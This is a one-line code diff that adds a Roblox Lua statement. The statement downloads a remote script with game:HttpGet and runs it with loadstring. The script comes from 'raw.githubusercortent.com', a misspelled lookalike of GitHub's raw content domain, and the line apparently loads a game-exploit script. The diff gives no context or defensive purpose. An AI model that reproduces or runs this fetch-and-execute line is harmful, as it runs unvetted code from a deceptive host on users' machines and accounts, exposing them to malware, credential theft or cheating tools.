@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercortent.com/Imalwibest/Imalwibest/main/wynerdV2.lua",true))()
